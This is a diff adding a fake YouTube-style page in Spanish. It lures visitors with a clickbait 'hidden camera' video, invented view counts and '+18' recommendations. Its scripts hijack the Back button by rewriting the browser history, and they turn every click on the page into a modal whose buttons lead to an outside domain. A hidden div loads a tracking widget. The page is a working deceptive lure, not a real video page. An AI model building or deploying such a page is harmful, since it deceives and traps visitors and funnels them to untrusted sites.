@@ -1,0 +1,149 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">
+	
+	<title>Youtube -  Video</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+	<link rel="stylesheet" href="http://saludybelleza.ooo/style.css">
+	<script
+  src="https://code.jquery.com/jquery-3.2.1.min.js"
+  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+  crossorigin="anonymous"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<script>
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.reload();
+    },0);
+  }
+}, false);
+}(window, location));
+	</script>
+</head>
+<body>
+	<header>
+		<div class="container">
+			<img src="http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-youtube-icon.png" width="40" height="25"></img>
+			<div style="float: right;">
+				<p class="glyphicon glyphicon-search" style="width: 30px;">
+				</p>
+				<i class="fa fa-ellipsis-v fa-lg" aria-hidden="true"></i>
+			</div>
+		</div>
+	</header>
+
+	<div id="myModal" class="modal fade" role="dialog">
+		<div class="modal-dialog">
+
+			<div class="modal-content">
+				<div class="modal-header text-center">
+					<button type="button" class="close" data-dismiss="modal">&times;</button>
+					<h4 class="modal-title">Youtube</h4>
+				</div>
+
+				<div class="modal-body text-center">
+					¿Seguro que quieres descargar el video?
+				</div>
+
+				<div class="modal-footer">
+				<a href="https://latubes.club">	<button class="btn btn-danger">Descargar Video</button></a>
+					<a href="https://latubes.club"><button class="btn btn-primary">Volver a Facebook</button></a>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="player">
+		
+		<img src="https://cdn.minds.com/api/v2/media/proxy?size=1920&src=https%3A%2F%2Fi.imgur.com%2FjB0na7K.png" id="player-background">
+	</div>
+
+	<div id="title-box">
+		<div class="container">
+			<div style="float:right;">
+			<i class="fa fa-sort-desc fa-lg" aria-hidden="true"></i>
+		</div>
+		</div>
+		<div class="col-sm-12">
+			<h4>Camara Oculta:</h4>
+		</div>
+
+		<div class="col-xs-12" style="font-size: 11px;">
+			<p>Facebook . <span id="view">345.123.132 Views</span></p>
+		</div>
+
+		<div class="col-xs-12" style="color: #6d6d6d; font-size: 11px">
+			<i class="icon fa fa-thumbs-up" aria-hidden="true"></i> 136K  
+			<i class="icon fa fa-thumbs-down" aria-hidden="true"></i>  1K
+
+			<div style="float:right;">
+				<i class="icon fa fa-plus fa-lg" aria-hidden="true"></i>
+				<i class="icon fa fa-share fa-lg" aria-hidden="true"></i>
+				<i class="icon fa fa-flag fa-lg" aria-hidden="true"></i>
+			</div>
+			<hr>
+		</div>
+	</div>
+
+	<div id="recomend">
+		<div class="container">
+			<div class="row">
+				<div class="col-xs-5 recomend-background">
+					<img src="https://i.ytimg.com/vi/0gd1joJ4hRQ/hqdefault.jpg?sqp=-oaymwEXCPYBEIoBSFryq4qpAwkIARUAAIhCGAE=&rs=AOn4CLDSbw03z8ddI18ajJiUr4U9mBsZbg" class="recomend-img">
+				</div>
+
+				<div class="col-xs-7 recomend-text">
+					Reaccion al video de  2017
+					<br>
+					Facebook
+					<br>
+					512.321 Views
+				</div>
+			</div>	
+
+			<div class="row">
+				<div class="col-xs-5 recomend-background">
+					<img src="https://4.bp.blogspot.com/-xwb9ZXvQ-ek/VwmbjxW_w1I/AAAAAAAADbc/ePKxpRtKMcoyciiFgE4Z_h24AY1wOpiWA/s1600/fobias.jpg" class="recomend-img">
+				</div>
+
+				<div class="col-xs-7 recomend-text">
+					Los Top peores videos +18 de Youtube
+					<br>
+					Facebook
+					<br>
+					512.321 Views
+				</div>
+			</div>
+
+			<div class="row">
+				<div class="col-xs-5 recomend-background">
+					<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFOl3fv7BwDYTUywUVuNJDngHRDgofa-W2iePuNn4RAqWuzpfP" class="recomend-img">
+				</div>
+
+				<div class="col-xs-7 recomend-text">
+					Insolitos momentos que no debieron ser capturados
+					<br>
+					Facebook
+					<br>
+					512.321 Views
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		$("body").on("click", function(){
+			$("#myModal").modal();
+		});
+	</script>
+	<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('icnadie')</script>
+</div>
+</body>
+</html>
